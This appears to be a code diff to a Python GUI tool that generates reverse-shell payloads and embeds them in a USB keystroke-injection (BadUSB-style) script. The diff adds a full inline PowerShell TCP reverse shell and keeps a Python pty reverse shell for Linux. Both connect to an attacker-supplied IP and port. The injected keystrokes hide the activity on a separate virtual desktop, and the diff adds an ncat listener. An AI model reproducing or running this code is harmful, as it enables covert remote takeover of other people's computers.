@@ -1,7 +1,7 @@
 import PySimpleGUI as sg
 import socket, sys, time
-
-
+import platform
+import os
 
 def generator():
     sg.theme('Dark Blue 3') 
@@ -26,15 +26,14 @@ def generator():
     print(values)
     ip=values[1]
     port=values[0]
-    os=0
+    localOs=0
     if values[2]:  #if windows
-        payload= "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell " + ip + " " + port
-
+        payload= f"$LHOST = \\\"{ip}\\\"; $LPORT = {port};"+" $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write(\\\"$Output`n\\\"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()"  
     if values[3]:  #if linux
         payload=f"export RHOST=\\\"{ip}\\\";export RPORT={port};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\\\"RHOST\\\"),int(os.getenv(\\\"RPORT\\\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\\\"sh\\\")'&"
-        os=1
+        localOs=1
     print(payload)
-    return [ip,port,payload,os,file_path]
+    return [ip,port,payload,localOs,file_path]
 
 def listen(ip,port):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -61,9 +60,9 @@ values=generator()
 ip=values[0]
 port=values[1]
 payload=values[2]
-os=values[3]
+localOs=values[3]
 file=values[4]
-if os == 0:
+if localOs == 0:
     PayloadFile=f"""# Basic Program to run some networking commands
 # Code also display some text on TFT screen
 # This code works for Windows based PC/Laptop but can be modified for Other OS
@@ -83,7 +82,8 @@ try:
     keyboard = Keyboard(usb_hid.devices)
     keyboard_layout = KeyboardLayout(keyboard)
     time.sleep(1)
-    keyboard.send(Keycode.WINDOWS, Keycode.LEFT_CONTROL, Keycode.RIGHT,Keycode.RIGHT_ARROW)
+    keyboard.send(Keycode.WINDOWS, Keycode.LEFT_CONTROL,Keycode.RIGHT_ARROW)
+    time.sleep(0.5)
     keyboard.send(Keycode.WINDOWS, Keycode.R)
     time.sleep(0.3)
     
@@ -101,7 +101,7 @@ try:
     keyboard_layout.write("{payload}") 
     keyboard.send(Keycode.ENTER)
     time.sleep(1)
-     keyboard.send(Keycode.WINDOWS, Keycode.LEFT_CONTROL, Keycode.RIGHT,Keycode.LEFT_ARROW)
+    keyboard.send(Keycode.WINDOWS, Keycode.LEFT_CONTROL,Keycode.LEFT_ARROW)
     keyboard.release_all()
     
 except Exception as ex:
@@ -110,7 +110,7 @@ except Exception as ex:
 
 
 """
-elif os == 1:
+elif localOs == 1:
     PayloadFile=f"""# Basic Program to run some networking commands
 # Code also display some text on TFT screen
 # This code works for Linux based PC/Laptop but can be modified for Other OS
@@ -161,5 +161,8 @@ if file:
 
 
 
+if platform.system() == "Windows":
+    os.system("cmd /c ncat -lvnp " + port)
 
-listen(ip,int(port))
+else:
+    listen(ip,int(port))
